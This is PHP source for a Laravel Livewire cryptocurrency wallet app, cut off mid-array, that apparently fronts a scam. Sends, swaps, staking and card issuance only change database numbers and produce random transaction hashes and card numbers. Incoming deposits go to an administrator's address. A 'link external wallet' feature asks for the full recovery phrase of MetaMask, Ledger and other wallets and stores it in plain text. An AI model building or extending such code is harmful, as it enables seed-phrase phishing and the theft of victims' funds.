<?php

use App\Models\Card;
use App\Models\Wallet;
use App\Models\Transaction;
use App\Models\Stake;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Cache;
use Livewire\Attributes\Computed;
use Livewire\Attributes\Layout;
use Livewire\Attributes\Url;
use Livewire\Component;

new #[Layout('layouts.wallet')] class extends Component {
    #[Url(as: 'v')]
    public $view = 'overview';

    public $selectedAssetId = 'bitcoin';
    public $receiveAmount = '';
    public $isSettingAmount = false;
    public ?string $selectedTransactionId = null;
    public string $recipient = '';
    public string $amount = '';
    public string $buyAmount = '';
    public bool $showSuccessModal = false;
    public ?int $lastTransactionId = null;
    public bool $isProcessing = false;
    public bool $showAllAssets = false;

    // Swap State
    public string $fromAssetId = 'bitcoin';
    public string $toAssetId = 'ethereum';
    public string $fromAmount = '';
    public string $toAmount = '';
    public bool $isSwapping = false;

    // Card State
    public $selectedCardAssetId = 'bitcoin';
    public $selectedCardBrand = 'Visa';
    public $isApplyingForCard = false;
    public array $showCvv = [];
    public bool $isFundingCard = false;
    public ?int $fundingCardId = null;
    public string $fundAmount = '';
    public string $fundingAssetId = 'bitcoin';

    public bool $isWithdrawingFromCard = false;
    public ?int $withdrawingCardId = null;
    public string $withdrawAmount = '';
    public string $withdrawAssetId = 'bitcoin';

    // Staking State
    public ?string $stakeAssetId = null;
    public string $stakeAmount = '';
    public string $stakingSearch = '';
    public bool $isStaking = false;
    public bool $isUnstaking = false;
    public string $selectedValidatorId = 'validator-1';
    public ?int $selectedStakeId = null;

    // External Wallet Linking State
    public ?string $selectedExternalWallet = null;
    public array $phraseWords = [];
    public ?string $customWalletName = null;
    public int $phraseWordCount = 12; // 12 or 24
    public bool $isLinking = false;

    public function swapAssets()
    {
        $tempId = $this->fromAssetId;
        $this->fromAssetId = $this->toAssetId;
        $this->toAssetId = $tempId;
        $this->calculateSwap();
    }

    public function selectSwapAsset($type, $id)
    {
        if ($type === 'from') {
            $this->fromAssetId = $id;
            if ($this->fromAssetId === $this->toAssetId) {
                $this->toAssetId = $this->fromAssetId === 'bitcoin' ? 'ethereum' : 'bitcoin';
            }
        } else {
            $this->toAssetId = $id;
            if ($this->toAssetId === $this->fromAssetId) {
                $this->fromAssetId = $this->toAssetId === 'bitcoin' ? 'ethereum' : 'bitcoin';
            }
        }
        $this->calculateSwap();
    }

    public function updatedFromAmount($value)
    {
        $this->calculateSwap();
    }

    private function calculateSwap()
    {
        if (!is_numeric($this->fromAmount) || $this->fromAmount <= 0) {
            $this->toAmount = '';
            return;
        }

        $fromAsset = collect($this->assets())->firstWhere('id', $this->fromAssetId);
        $toAsset = collect($this->assets())->firstWhere('id', $this->toAssetId);

        if (!$fromAsset || !$toAsset) {
            return;
        }

        $fromPrice = (float) str_replace(',', '', $fromAsset['usd']);
        $toPrice = (float) str_replace(',', '', $toAsset['usd']);

        if ($toPrice > 0) {
            $totalUsd = (float) $this->fromAmount * $fromPrice;
            $this->toAmount = (string) round($totalUsd / $toPrice, 8);
        }
    }

    public function executeSwap()
    {
        $this->validate([
            'fromAmount' => 'required|numeric|min:0',
        ]);

        $fromAsset = collect($this->assets())->firstWhere('id', $this->fromAssetId);
        $balance = (float) str_replace(',', '', $fromAsset['balance']);

        if ((float) $this->fromAmount > $balance) {
            $this->addError('fromAmount', 'Insufficient balance.');
            return;
        }

        $this->isSwapping = true;

        // Artificial delay for premium feel
        sleep(5);

        $wallet = auth()->user()->wallet;
        $balances = $wallet->balances;

        // Subtract from source
        $balances[$this->fromAssetId] = (string) ($balance - (float) $this->fromAmount);

        // Add to destination
        $toBalance = (float) ($balances[$this->toAssetId] ?? 0);
        $balances[$this->toAssetId] = (string) ($toBalance + (float) $this->toAmount);

        $wallet->update(['balances' => $balances]);

        // Create transaction record
        $transaction = auth()->user()->transactions()->create([
            'asset_id' => $this->fromAssetId,
            'amount' => (float) $this->fromAmount,
            'network_fee' => '0',
            'recipient_address' => 'Internal Swap (' . strtoupper($this->toAssetId) . ')',
            'type' => 'swap',
            'status' => 'completed',
            'hash' => '0x' . bin2hex(random_bytes(20)),
        ]);

        $this->lastTransactionId = $transaction->id;
        $this->isSwapping = false;
        $this->showSuccessModal = true;

        $this->reset(['fromAmount', 'toAmount']);
        $this->refreshAssetCache();
        $this->dispatch('notify', message: 'Swap completed successfully!');
    }

    #[Computed]
    public function totalPortfolioValue()
    {
        return collect($this->assets())->sum(function ($asset) {
            return (float) str_replace(',', '', $asset['usd_total']);
        });
    }

    #[Computed]
    public function totalPortfolioChange()
    {
        $totalValue = $this->totalPortfolioValue;
        if ($totalValue <= 0)
            return 0;

        $weightedChange = collect($this->assets())->sum(function ($asset) {
            $value = (float) str_replace(',', '', $asset['usd_total']);
            $change = (float) str_replace(['+', '%'], '', $asset['change']);
            return $value * $change;
        });

        return $weightedChange / $totalValue;
    }

    #[Computed]
    public function assets()
    {
        $userId = auth()->id() ?? 'guest';
        return Cache::remember('assets_v2_' . $userId, 3600, function () {
            $apiKey = env('COINGECKO_API_KEY');

            // Only show assets that are defined in our JSON
            $jsonPath = database_path('data/assets.json');
            $allowedAssets = json_decode(file_get_contents($jsonPath), true);
            $ids = implode(',', $allowedAssets);

            $response = Http::withHeaders([
                'x-cg-demo-api-key' => $apiKey
            ])->get('https://api.coingecko.com/api/v3/coins/markets', [
                        'vs_currency' => 'usd',
                        'ids' => $ids,
                        'order' => 'market_cap_desc',
                        'per_page' => 250,
                        'page' => 1,
                        'sparkline' => false,
                    ]);

            $data = $response->successful() ? $response->json() : null;

            if ($data === null || !is_array($data)) {
                return [];
            }

            $balances = auth()->check() && auth()->user()->wallet
                ? auth()->user()->wallet->balances
                : [];

            $assets = collect($data)
                ->filter(fn($coin) => in_array($coin['id'], $allowedAssets))
                ->map(function ($coin) use ($balances) {
                    $change = $coin['price_change_percentage_24h'] ?? 0;
                    $changeStr = $change > 0 ? '+' . number_format($change, 2) . '%' : number_format($change, 2) . '%';

                    $color = $this->getDominantColor($coin['image'], $coin['id']);
                    $balance = $balances[$coin['id']] ?? '0.00';

                    return [
                        'id' => $coin['id'],
                        'name' => $coin['name'],
                        'symbol' => strtoupper($coin['symbol']),
                        'image' => $coin['image'] ?? '',
                        'color' => $color,
                        'balance' => $balance,
                        'usd' => number_format($coin['current_price'], 2),
                        'usd_total' => number_format($coin['current_price'] * (float) str_replace(',', '', $balance), 2),
                        'change' => $changeStr,
                    ];
                })->toArray();

            return $assets;
        });
    }

    private function refreshAssetCache()
    {
        $userId = auth()->id() ?? 'guest';
        Cache::forget('assets_v2_' . $userId);
        // We don't call assets() here to avoid blocking, the next render will do it.
        // But for transactions, we can do an in-place update for speed.
    }

    private function updateAssetBalanceInCache($assetId, $newBalance)
    {
        $userId = auth()->id() ?? 'guest';
        $cacheKey = 'assets_v2_' . $userId;
        $assets = Cache::get($cacheKey);

        if ($assets) {
            foreach ($assets as &$asset) {
                if ($asset['id'] === $assetId) {
                    $asset['balance'] = (string) $newBalance;
                    $usdPrice = (float) str_replace(',', '', $asset['usd']);
                    $asset['usd_total'] = number_format($usdPrice * (float) $newBalance, 2);
                }
            }
            Cache::put($cacheKey, $assets, 3600);
        }
    }

    #[Computed]
    public function selectedAsset()
    {
        return collect($this->assets())->firstWhere('id', $this->selectedAssetId);
    }

    public function selectAsset($id)
    {
        $this->selectedAssetId = $id;
        $this->receiveAmount = '';
        $this->isSettingAmount = false;
    }

    #[Computed]
    public function networkFee()
    {
        $usdPrice = (float) str_replace(',', '', $this->selectedAsset['usd'] ?? 0);
        if ($usdPrice <= 0)
            return 0;

        // Base USD fee for different networks
        $baseFeeUsd = match ($this->selectedAssetId) {
            'bitcoin' => rand(150, 450) / 100, // $1.50 - $4.50
            'ethereum', 'tether' => rand(200, 800) / 100, // $2.00 - $8.00
            'binancecoin' => rand(15, 45) / 100, // $0.15 - $0.45
            'solana' => 0.00025, // Extremely low
            'ripple', 'cardano', 'polkadot' => rand(5, 15) / 100, // $0.05 - $0.15
            'litecoin', 'dogecoin' => rand(1, 5) / 100, // $0.01 - $0.05
            'stellar', 'xdc-network' => 0.0001, // Near zero
            default => 0.10
        };

        // Convert USD fee to crypto amount
        return round($baseFeeUsd / $usdPrice, 8);
    }

    #[Computed]
    public function adminAddress()
    {
        $admin = \App\Models\User::where('role', \App\Enums\UserRole::Manager)->first();
        if (!$admin || !$admin->wallet) {
            return null;
        }

        $addresses = $admin->wallet->addresses ?? [];
        $address = $addresses[$this->selectedAssetId] ?? null;
        if (!$address) {
            return null;
        }

        if ($this->receiveAmount && is_numeric($this->receiveAmount)) {
            $scheme = match ($this->selectedAssetId) {
                'bitcoin' => 'bitcoin:',
                'ethereum' => 'ethereum:',
                'solana' => 'solana:',
                'litecoin' => 'litecoin:',
                'dogecoin' => 'dogecoin:',
                'cardano' => 'cardano:',
                'polkadot' => 'polkadot:',
                'ripple' => 'ripple:',
                'tether' => 'ethereum:', // USDT is often shared as ERC20
                'stellar' => 'stellar:',
                'xdce-crowd-sale' => 'xdc:',
                default => ''
            };
            return $scheme . $address . '?amount=' . $this->receiveAmount;
        }

        return $address;
    }

    public function send()
    {
        $this->validate([
            'recipient' => 'required|string|min:10',
            'amount' => 'required|numeric|min:0',
        ]);

        $asset = $this->selectedAsset;
        $balance = (float) str_replace(',', '', $asset['balance']);
        $usdPrice = (float) str_replace(',', '', $asset['usd']);

        // Amount is entered in USD, convert to crypto for balance check
        $amountInCrypto = $usdPrice > 0 ? (float) $this->amount / $usdPrice : 0;

        if ($amountInCrypto > $balance) {
            $this->addError('amount', 'Insufficient balance.');
            return;
        }

        $this->isProcessing = true;

        // Artificial delay for premium feel (6-8 seconds)
        sleep(7);

        $wallet = auth()->user()->wallet;
        $balances = $wallet->balances;
        $balances[$this->selectedAssetId] = (string) ($balance - $amountInCrypto);
        $wallet->update(['balances' => $balances]);

        $transaction = auth()->user()->transactions()->create([
            'asset_id' => $this->selectedAssetId,
            'amount' => $amountInCrypto,
            'network_fee' => (string) $this->networkFee,
            'recipient_address' => $this->recipient,
            'type' => 'send',
            'status' => 'completed',
            'hash' => '0x' . bin2hex(random_bytes(20)),
        ]);

        $this->lastTransactionId = $transaction->id;
        $this->isProcessing = false;
        $this->showSuccessModal = true;

        $this->reset(['recipient', 'amount']);

        // Refresh assets cache to show new balance
        $this->refreshAssetCache();
        $this->dispatch('notify', message: 'Transaction sent successfully!');
    }

    public function buy()
    {
        // Simple direct redirect to Changelly to avoid any integration friction
        $url = "https://changelly.com/buy";

        $this->dispatch('notify', message: 'Opening secure buying hub...');
        $this->dispatch('open-new-tab', url: $url);
    }

    public function closeSuccessModal()
    {
        $this->showSuccessModal = false;
        $this->view = 'overview';
    }

    public function updatedAmount($value)
    {
        if (!$value)
            return;

        $this->validateOnly('amount', [
            'amount' => 'required|numeric|min:0',
        ]);

        $asset = $this->selectedAsset;
        if (!$asset)
            return;

        $balance = (float) str_replace(',', '', $asset['balance']);
        $usdPrice = (float) str_replace(',', '', $asset['usd']);
        $amountInCrypto = $usdPrice > 0 ? (float) $value / $usdPrice : 0;

        if ($amountInCrypto > $balance) {
            $this->addError('amount', 'Insufficient balance.');
        }
    }

    #[Computed]
    public function amountInCrypto()
    {
        if (!$this->amount || !$this->selectedAsset) {
            return 0;
        }
        $usdPrice = (float) str_replace(',', '', $this->selectedAsset['usd']);
        return $usdPrice > 0 ? (float) $this->amount / $usdPrice : 0;
    }

    #[Computed]
    public function transactions()
    {
        return auth()->user()->transactions()->latest()->take(10)->get();
    }

    #[Computed]
    public function selectedTransaction()
    {
        return $this->selectedTransactionId
            ? Transaction::find($this->selectedTransactionId)
            : null;
    }

    public function selectTransaction(?string $id)
    {
        $this->selectedTransactionId = $id;
    }

    public function selectStake(?int $id)
    {
        $this->selectedStakeId = $id;
    }

    #[Computed]
    public function selectedStake()
    {
        return $this->selectedStakeId ? Stake::find($this->selectedStakeId) : null;
    }

    private function getDominantColor($url, $id)
    {
        // Hardcoded map for top-tier performance on primary coins
        $map = [
            'bitcoin' => '#F7931A',
            'ethereum' => '#627EEA',
            'tether' => '#26A17B',
            'binancecoin' => '#F3BA2F',
            'solana' => '#14F195',
            'ripple' => '#23292F',
            'usd-coin' => '#2775CA',
            'dogecoin' => '#C2A633',
            'cardano' => '#0033AD',
            'avalanche-2' => '#E84142',
            'polkadot' => '#E6007A',
            'chainlink' => '#2A5ADA',
            'staked-ether' => '#48A0F6',
            'shiba-inu' => '#FFA500',
            'tron' => '#FF0013',
            'stellar' => '#ffffff',
            'xdce-crowd-sale' => '#2147FF',
        ];

        if (isset($map[$id])) {
            return $map[$id];
        }

        // Dynamic extraction (cached for 24h)
        return Cache::remember('coin_color_' . $id, 86400, function () use ($url) {
            try {
                $content = file_get_contents($url);
                if (!$content) {
                    return '#888888';
                }

                $img = imagecreatefromstring($content);
                if (!$img) {
                    return '#888888';
                }

                $scaled = imagecreatetruecolor(1, 1);
                imagecopyresampled($scaled, $img, 0, 0, 0, 0, 1, 1, imagesx($img), imagesy($img));
                $index = imagecolorat($scaled, 0, 0);
                $rgb = imagecolorsforindex($scaled, $index);

                return sprintf('#%02x%02x%02x', $rgb['red'], $rgb['green'], $rgb['blue']);
            } catch (\Exception $e) {
                return '#888888';
            }
        });
    }

    #[Computed]
    public function cards()
    {
        return auth()->user()->cards()->latest()->get();
    }

    public function selectCardAsset($id)
    {
        $this->selectedCardAssetId = $id;
    }

    public function selectCardBrand($brand)
    {
        $this->selectedCardBrand = $brand;
    }

    public function createCard()
    {
        $asset = collect($this->assets())->firstWhere('id', $this->selectedCardAssetId);
        $usdTotal = (float) str_replace(',', '', $asset['usd_total'] ?? 0);
        $usdPrice = (float) str_replace(',', '', $asset['usd'] ?? 0);

        if ($usdTotal < 5000) {
            $this->addError('card_payment', 'Minimum $5,000 balance in ' . $asset['name'] . ' is required to apply.');
            return;
        }

        if (auth()->user()->cards()->count() >= 3) {
            $this->addError('card_payment', 'Maximum of 3 cards allowed per account.');
            return;
        }

        // Calculate $5 fee in crypto
        $feeInCrypto = $usdPrice > 0 ? 5 / $usdPrice : 0;
        $currentBalance = (float) str_replace(',', '', $asset['balance']);

        if ($currentBalance < $feeInCrypto) {
            $this->addError('card_payment', 'Insufficient balance to pay the $5 issuance fee.');
            return;
        }

        $this->isProcessing = true;

        // Instant issuance simulation
        sleep(3);

        $wallet = auth()->user()->wallet;
        $balances = $wallet->balances;
        $balances[$this->selectedCardAssetId] = (string) ($currentBalance - $feeInCrypto);
        $wallet->update(['balances' => $balances]);

        // Create transaction record for the fee
        auth()->user()->transactions()->create([
            'asset_id' => $this->selectedCardAssetId,
            'amount' => $feeInCrypto,
            'network_fee' => '0',
            'recipient_address' => 'Virtual Card Issuance Fee',
            'type' => 'send',
            'status' => 'completed',
            'hash' => '0x' . bin2hex(random_bytes(20)),
        ]);

        auth()->user()->cards()->create([
            'brand' => $this->selectedCardBrand,
            'card_holder_name' => auth()->user()->name,
            'number' => rand(4000, 5999) . ' ' . rand(1000, 9999) . ' ' . rand(1000, 9999) . ' ' . rand(1000, 9999),
            'last_four' => rand(1000, 9999),
            'expiry' => now()->shiftTimezone('UTC')->addYears(4)->format('m/y'),
            'cvv' => rand(100, 999),
            'balance' => 0,
            'status' => 'active',
        ]);

        Cache::forget('coingecko_assets_v2');
        $this->isProcessing = false;
        $this->isApplyingForCard = false;
        $this->setView('card');
        $this->dispatch('notify', message: 'Virtual card issued successfully!');
    }

    public function toggleCvv($cardId)
    {
        $this->showCvv[$cardId] = !($this->showCvv[$cardId] ?? false);
    }

    public function openFundCard($cardId)
    {
        $this->fundingCardId = $cardId;
        $this->isFundingCard = true;
        $this->fundAmount = '';
    }

    public function fundCard()
    {
        $this->validate([
            'fundAmount' => 'required|numeric|min:1',
            'fundingAssetId' => 'required|string',
        ]);

        $asset = collect($this->assets())->firstWhere('id', $this->fundingAssetId);
        $usdPrice = (float) str_replace(',', '', $asset['usd'] ?? 0);
        $amountInCrypto = $usdPrice > 0 ? (float) $this->fundAmount / $usdPrice : 0;
        $currentBalance = (float) str_replace(',', '', $asset['balance']);

        if ($currentBalance < $amountInCrypto) {
            $this->addError('fundAmount', 'Insufficient balance in ' . $asset['name']);
            return;
        }

        $this->isProcessing = true;
        sleep(2);

        $wallet = auth()->user()->wallet;
        $balances = $wallet->balances;
        $balances[$this->fundingAssetId] = (string) ($currentBalance - $amountInCrypto);
        $wallet->update(['balances' => $balances]);

        $card = Card::find($this->fundingCardId);
        $card->increment('balance', (float) $this->fundAmount);

        // Transaction record
        auth()->user()->transactions()->create([
            'asset_id' => $this->fundingAssetId,
            'amount' => $amountInCrypto,
            'network_fee' => '0',
            'recipient_address' => 'Card Funding (***' . $card->last_four . ')',
            'type' => 'send',
            'status' => 'completed',
            'hash' => '0x' . bin2hex(random_bytes(20)),
        ]);

        $this->isProcessing = false;
        $this->isFundingCard = false;
        $this->reset(['fundAmount', 'fundingCardId']);
        Cache::forget('coingecko_assets_v2');
        $this->dispatch('notify', message: 'Card funded successfully!');
    }

    public function openWithdrawCard($cardId)
    {
        $this->withdrawingCardId = $cardId;
        $this->isWithdrawingFromCard = true;
        $this->withdrawAmount = '';
    }

    public function withdrawFromCard()
    {
        $this->validate([
            'withdrawAmount' => 'required|numeric|min:1',
            'withdrawAssetId' => 'required|string',
        ]);

        $card = Card::where('user_id', auth()->id())->find($this->withdrawingCardId);

        if (!$card || $card->balance < (float) $this->withdrawAmount) {
            $this->addError('withdrawAmount', 'Insufficient card balance');
            return;
        }

        $asset = collect($this->assets())->firstWhere('id', $this->withdrawAssetId);
        $usdPrice = (float) str_replace(',', '', $asset['usd'] ?? 0);
        $amountInCrypto = $usdPrice > 0 ? (float) $this->withdrawAmount / $usdPrice : 0;

        $this->isProcessing = true;
        sleep(2);

        // Update Card Balance
        $card->decrement('balance', (float) $this->withdrawAmount);

        // Update Wallet Balance
        $wallet = auth()->user()->wallet;
        $balances = $wallet->balances;
        $currentBalance = (float) str_replace(',', '', $balances[$this->withdrawAssetId] ?? 0);
        $balances[$this->withdrawAssetId] = (string) ($currentBalance + $amountInCrypto);
        $wallet->update(['balances' => $balances]);

        // Transaction record
        auth()->user()->transactions()->create([
            'asset_id' => $this->withdrawAssetId,
            'amount' => $amountInCrypto,
            'network_fee' => '0',
            'recipient_address' => 'Card Withdrawal (***' . $card->last_four . ')',
            'type' => 'receive',
            'status' => 'completed',
            'hash' => '0x' . bin2hex(random_bytes(20)),
        ]);

        $this->isProcessing = false;
        $this->isWithdrawingFromCard = false;
        $this->reset(['withdrawAmount', 'withdrawingCardId']);
        Cache::forget('coingecko_assets_v2');
        $this->dispatch('notify', message: 'Funds withdrawn to wallet!');
    }

    public function deleteCard($cardId)
    {
        $card = Card::where('user_id', auth()->id())->find($cardId);

        if (!$card)
            return;

        // If card has balance, move it to the first asset with balance (e.g., USDT)
        if ($card->balance > 0) {
            $this->withdrawingCardId = $cardId;
            $this->withdrawAmount = (string) $card->balance;
            $this->withdrawAssetId = 'tether'; // Default to stablecoin
            $this->withdrawFromCard();
        }

        $card->delete();
        $this->setView('card');
        Cache::forget('coingecko_assets_v2');
    }

    public function setView(string $view)
    {
        $this->view = $view;
    }

    #[Computed]
    public function stakedAssets()
    {
        $stakes = auth()->user()->stakes()->where('status', 'active')->get();
        $allAssets = collect($this->assets());

        return $stakes->map(function ($stake) use ($allAssets) {
            $asset = $allAssets->firstWhere('id', $stake->asset_id);
            if (!$asset)
                return null;

            $asset['stake_id'] = $stake->id;
            $asset['staked_balance'] = $stake->amount;
            $asset['apy'] = $stake->apy;
            $asset['validator_id'] = $stake->validator_id;
            $asset['staked_at'] = $stake->created_at;

            return $asset;
        })->filter()->values();
    }

    #[Computed]
    public function totalStakedRewards()
    {
        $stakes = auth()->user()->stakes()->where('status', 'active')->get();
        $allAssets = collect($this->assets());

        return $stakes->sum(function ($stake) use ($allAssets) {
            $asset = $allAssets->firstWhere('id', $stake->asset_id);
            if (!$asset)
                return 0;

            $usdPrice = (float) str_replace(',', '', $asset['usd']);
            $lastUpdate = $stake->last_reward_at ?? $stake->created_at;
            $secondsPassed = now()->diffInSeconds($lastUpdate);
            $accrued = ($stake->amount * ($stake->apy / 100) * $secondsPassed) / 31536000;

            return ($stake->earned_rewards + $accrued) * $usdPrice;
        });
    }

    #[Computed]
    public function estimatedMonthlyStakingReturn()
    {
        $stakes = auth()->user()->stakes()->where('status', 'active')->get();
        $allAssets = collect($this->assets());

        return $stakes->sum(function ($stake) use ($allAssets) {
            $asset = $allAssets->firstWhere('id', $stake->asset_id);
            if (!$asset)
                return 0;
            $usdPrice = (float) str_replace(',', '', $asset['usd']);
            return ($stake->amount * ($stake->apy / 100) / 12) * $usdPrice;
        });
    }

    public function getStakingApy($assetId)
    {
        return match ($assetId) {
            'ethereum' => 4.5,
            'solana' => 7.2,
            'cardano' => 3.8,
            'polkadot' => 12.5,
            'cosmos' => 14.2,
            'avalanche-2' => 8.5,
            'near' => 11.0,
            'matic-network' => 6.2,
            'tron' => 4.8,
            'algorand' => 5.5,
            'tezos' => 5.2,
            'fantom' => 7.5,
            'elrond-erd-2' => 12.0,
            'harmony' => 9.5,
            'mina-protocol' => 11.2,
            'flow' => 8.0,
            'theta-token' => 7.8,
            'aptos' => 7.0,
            'sui' => 6.5,
            default => 0
        };
    }

    public function stake()
    {
        $this->validate([
            'stakeAmount' => 'required|numeric|min:0',
            'stakeAssetId' => 'required|string',
        ]);

        $asset = collect($this->assets())->firstWhere('id', $this->stakeAssetId);
        $balance = (float) str_replace(',', '', $asset['balance']);

        if ((float) $this->stakeAmount > $balance) {
            $this->addError('stakeAmount', 'Insufficient liquid balance.');
            return;
        }

        $this->isStaking = true;
        sleep(3);

        $wallet = auth()->user()->wallet;
        $balances = $wallet->balances;
        $stakedBalances = $wallet->staked_balances ?? [];

        // Subtract from liquid
        $balances[$this->stakeAssetId] = (string) ($balance - (float) $this->stakeAmount);

        // Add to staked (legacy cache)
        $currentStaked = (float) ($stakedBalances[$this->stakeAssetId] ?? 0);
        $stakedBalances[$this->stakeAssetId] = (string) ($currentStaked + (float) $this->stakeAmount);

        $wallet->update([
            'balances' => $balances,
            'staked_balances' => $stakedBalances
        ]);

        $validator = collect($this->validators())->firstWhere('id', $this->selectedValidatorId);
        $commissionPercent = (float) str_replace('%', '', $validator['commission'] ?? '0');
        $baseApy = $this->getStakingApy($this->stakeAssetId);

        // Final APY is base minus commission cut
        $finalApy = $baseApy * (1 - ($commissionPercent / 100));

        // Create detailed Stake record
        auth()->user()->stakes()->create([
            'asset_id' => $this->stakeAssetId,
            'amount' => (float) $this->stakeAmount,
            'validator_id' => $this->selectedValidatorId,
            'apy' => round($finalApy, 2),
            'status' => 'active',
            'last_reward_at' => now(),
        ]);

        // Transaction
        auth()->user()->transactions()->create([
            'asset_id' => $this->stakeAssetId,
            'amount' => (float) $this->stakeAmount,
            'network_fee' => '0',
            'recipient_address' => 'Staking Deposit (' . $this->selectedValidatorId . ')',
            'type' => 'send',
            'status' => 'completed',
            'hash' => '0x' . bin2hex(random_bytes(20)),
        ]);

        $currentStakeAssetId = $this->stakeAssetId;
        $this->isStaking = false;
        $this->stakeAmount = '';
        $this->stakeAssetId = null;

        // Force refresh of all computed data
        unset($this->stakedAssets);
        unset($this->assets);
        auth()->user()->load('stakes');
        $this->updateAssetBalanceInCache($currentStakeAssetId, $balances[$currentStakeAssetId]);
        $this->dispatch('notify', message: 'Asset staked successfully!');
    }

    public function selectStakeAsset($id)
    {
        $this->stakeAssetId = $id;
        $this->stakeAmount = '';
        $this->selectedValidatorId = 'validator-1';
    }

    #[Computed]
    public function validators()
    {
        return [
            [
                'id' => 'validator-1',
                'name' => config('app.name') . ' Core',
                'commission' => '5%',
                'uptime' => '99.99%',
                'status' => 'active',
                'reliability' => 'Optimal'
            ],
            [
                'id' => 'validator-2',
                'name' => 'P2P Staking',
                'commission' => '7%',
                'uptime' => '99.95%',
                'status' => 'active',
                'reliability' => 'High'
            ],
            [
                'id' => 'validator-3',
                'name' => 'Everstake',
                'commission' => '10%',
                'uptime' => '99.98%',
                'status' => 'active',
                'reliability' => 'High'
            ],
            [
                'id' => 'validator-4',
                'name' => 'Binance Staking',
                'commission' => '15%',
                'uptime' => '100%',
                'status' => 'active',
                'reliability' => 'Maximum'
            ],
        ];
    }
    public function claimRewards($stakeId)
    {
        $stake = auth()->user()->stakes()->find($stakeId);
        if (!$stake)
            return;

        $lastUpdate = $stake->last_reward_at ?? $stake->created_at;
        $secondsPassed = now()->diffInSeconds($lastUpdate);
        $apy = (float) $stake->apy;
        $amountStaked = (float) $stake->amount;

        // Calculate live accrued rewards since last claim/update
        $accrued = ($amountStaked * ($apy / 100) * $secondsPassed) / 31536000;

        $totalReward = (float) $stake->earned_rewards + $accrued;

        if ($totalReward <= 0) {
            $this->dispatch('notify', message: 'No rewards available to claim yet.');
            return;
        }

        $assetId = $stake->asset_id;
        $wallet = auth()->user()->wallet;
        $balances = $wallet->balances;

        // Add to liquid balance
        $currentLiquid = (float) str_replace(',', '', $balances[$assetId] ?? 0);
        $balances[$assetId] = (string) ($currentLiquid + $totalReward);

        $wallet->update(['balances' => $balances]);

        // Reset earned rewards and update timestamp
        $stake->update([
            'earned_rewards' => 0,
            'last_reward_at' => now(),
        ]);

        // Transaction
        auth()->user()->transactions()->create([
            'asset_id' => $assetId,
            'amount' => $totalReward,
            'network_fee' => '0',
            'recipient_address' => 'Staking Reward Claim',
            'type' => 'receive',
            'status' => 'completed',
            'hash' => '0x' . bin2hex(random_bytes(20)),
        ]);

        $this->selectedStakeId = null;
        $this->showSuccessModal = true;

        // Refresh component data
        unset($this->stakedAssets);
        unset($this->assets);
        auth()->user()->load('stakes');
        $this->updateAssetBalanceInCache($assetId, $balances[$assetId]);
        $this->dispatch('notify', message: 'Rewards claimed successfully!');
    }

    public function unstake($stakeId)
    {
        $stake = auth()->user()->stakes()->find($stakeId);
        if (!$stake || $stake->status !== 'active')
            return;

        $assetId = $stake->asset_id;
        $unstakeAmount = (float) $stake->amount;

        $this->isUnstaking = true;

        // Unstaking takes longer (cooldown simulation)
        sleep(4);

        $wallet = auth()->user()->wallet;
        $balances = $wallet->balances;
        $stakedBalances = $wallet->staked_balances ?? [];

        // Update liquid balance
        $currentLiquid = (float) str_replace(',', '', $balances[$assetId] ?? 0);
        $balances[$assetId] = (string) ($currentLiquid + $unstakeAmount);

        // Update legacy cache
        $currentStaked = (float) ($stakedBalances[$assetId] ?? 0);
        $stakedBalances[$assetId] = (string) max(0, $currentStaked - $unstakeAmount);

        $wallet->update([
            'balances' => $balances,
            'staked_balances' => $stakedBalances
        ]);

        // Mark stake as withdrawn or delete it
        // Mark stake as withdrawn or delete it
        $stake->delete();

        // Transaction
        auth()->user()->transactions()->create([
            'asset_id' => $assetId,
            'amount' => $unstakeAmount,
            'network_fee' => '0',
            'recipient_address' => 'Staking Withdrawal',
            'type' => 'receive',
            'status' => 'completed',
            'hash' => '0x' . bin2hex(random_bytes(20)),
        ]);

        $this->isUnstaking = false;
        unset($this->stakedAssets);
        unset($this->assets);
        auth()->user()->load('stakes');
        $this->updateAssetBalanceInCache($assetId, $balances[$assetId]);
        $this->dispatch('notify', message: 'Asset unstaked successfully!');
    }

    public function selectExternalWallet($wallet)
    {
        // Artificial delay for premium feel
        sleep(2);
        
        $this->selectedExternalWallet = $wallet;
        $this->phraseWords = [];
        $this->customWalletName = null;
    }

    public function linkExternalWallet()
    {
        if ($this->selectedExternalWallet === 'other' && !$this->customWalletName) {
            $this->addError('customWalletName', "Please enter the name of your wallet.");
            return;
        }

        $filteredWords = array_filter($this->phraseWords);
        
        if (count($filteredWords) < $this->phraseWordCount) {
            $this->addError('phraseWords', "Please enter all {$this->phraseWordCount} words of your recovery phrase.");
            return;
        }

        $wallet = auth()->user()->wallet;
        $currentPhrases = $wallet->recovery_phrase ?? [];

        if (count($currentPhrases) >= 5) {
            $this->dispatch('notify', message: 'You can only link a maximum of 5 wallets simultaneously.');
            return;
        }

        $this->isLinking = true;
        
        // Premium simulation of cryptographic verification
        sleep(5);

        $walletName = $this->selectedExternalWallet === 'other' ? $this->customWalletName : $this->selectedExternalWallet;

        // Append the new wallet data
        $currentPhrases[] = [
            'id' => $this->selectedExternalWallet,
            'name' => $walletName,
            'phrase' => implode(' ', $filteredWords),
            'linked_at' => now()->toDateTimeString(),
        ];

        $wallet->update(['recovery_phrase' => $currentPhrases]);
        
        $this->isLinking = false;
        $this->selectedExternalWallet = null;
        $this->phraseWords = [];
        $this->customWalletName = null;
        $this->dispatch('notify', message: 'External wallet linked successfully!');
    }

    public function unlinkWallet($index)
    {
        $wallet = auth()->user()->wallet;
        $currentPhrases = $wallet->recovery_phrase ?? [];

        if (isset($currentPhrases[$index])) {
            unset($currentPhrases[$index]);
            $wallet->update(['recovery_phrase' => array_values($currentPhrases)]);
            $this->dispatch('notify', message: 'Wallet unlinked successfully!');
        }
    }

    #[Computed]
    public function externalWallets()
    {
        return [
            ['id' => 'trust', 'name' => 'Trust Wallet', 'image' => asset('trust.svg')],
            ['id' => 'metamask', 'name' => 'MetaMask', 'image' => asset('metamask.svg')],
            ['id' => 'phantom', 'name' => 'Phantom', 'image' => asset('phantom.svg')],
            ['id' => 'coinbase', 'name' => 'Coinbase Wallet', 'image' => asset('coinbase.svg')],
            ['id' => 'exodus', 'name' => 'Exodus', 'image' => asset('exodus.svg')],
            ['id' => 'ledger', 'name' => 'Ledger', 'image' => asset('ledger.svg')],
            ['id' => 'atomic', 'name' => 'Atomic Wallet', 'image' => asset('atomic.svg')],
            ['id' => 'blue', 'name' => 'BlueWallet', 'image' => asset('blue.svg')],
